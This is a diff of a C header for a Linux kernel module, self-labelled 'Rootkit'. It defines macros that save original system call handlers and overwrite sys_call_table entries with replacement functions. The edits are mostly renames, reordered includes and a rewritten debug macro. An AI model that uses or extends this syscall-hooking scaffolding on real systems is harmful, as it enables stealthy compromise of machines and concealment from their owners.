@@ -1,8 +1,6 @@
-#ifndef __RT_ONLINE__
-#define __RT_ONLINE__
+#ifndef __RT_MAIN__
+#define __RT_MAIN__
 
-#include <linux/module.h>
-#include <linux/syscalls.h>
 #include <linux/file.h>
 #include <linux/dirent.h>
 #include <linux/fs_struct.h>
@@ -12,36 +10,21 @@
 #include <linux/list.h>
 #include <net/tcp.h>
 #include <linux/in.h>
+#include <linux/module.h> /* module_init module_exit */
+#include <linux/init.h> /* __init __exit */
+#include <linux/syscalls.h> /* sys_close __NR_close __NR_mkdir */
+#include <linux/delay.h> /* loops_per_jiffy */
+#include <asm/bitops.h> /* set_bit clear_bit */
 
-
-// if we need debug this program
 #define DEBUG
 
-// this is the prefix of debug message
-//#define RT_DESP "rootkit"
-
-// maximum length of the path
-#define MAX_PATH 260
-
-
-// check if we need output debug message
-#ifdef DEBUG
-// we use rtprint instead of printk
-#define rtprint(fmt, args...) printk("%s:"fmt"\n", "rootkit", ##args)
-#else
-// there is no need to output the message
-#define rtprint(fmt, args...)
-#endif // debug
-
 #ifdef DEBUG  
-# define DLog(fmt, ...) NSLog((@"[文件名:%s]\n" "[函数名:%s]\n" "[行号:%d] \n" fmt), __FILE__, __FUNCTION__, __LINE__, ##__VA_ARGS__);  
+# define DLog(fmt, ... ) printk(("Rootkit:%s-[%s]:%d " fmt "\n"), __FILE__, __FUNCTION__, __LINE__, ##__VA_ARGS__);  
 #else  
 # define DLog(...);  
 #endif  
 
-
-
-
+#define MAX_PATH 1020
 
 #ifndef __AVOID_NULL__
 #define __AVOID_NULL__
@@ -50,15 +33,14 @@
 if(args1) call(args1);\
 }
 
-#endif // __AVOID_NULL__
+#endif 
 
 
-static unsigned long **sys_call_table;
-extern unsigned int addr_do_fork;
 
 
 // define a struct to save system call
 #define RT_SYSCALL_DEFINE(ret, name, args...) \
+asmlinkage ret rt_sys_##name(args); \
 union {\
     unsigned long val;\
     asmlinkage ret (*fuc)(args);\
@@ -70,7 +52,7 @@ asmlinkage ret rt_sys_##name(args)
 
 // replace the original system call
 #define RT_SYSCALL_REPLACE(name) {\
-orig_sys_##name.val = sys_call_table[__NR_##name];\
+orig_sys_##name.val = (unsigned long)sys_call_table[__NR_##name];\
 sys_call_table[__NR_##name] = (unsigned long)(rt_sys_##name);\
 }
 
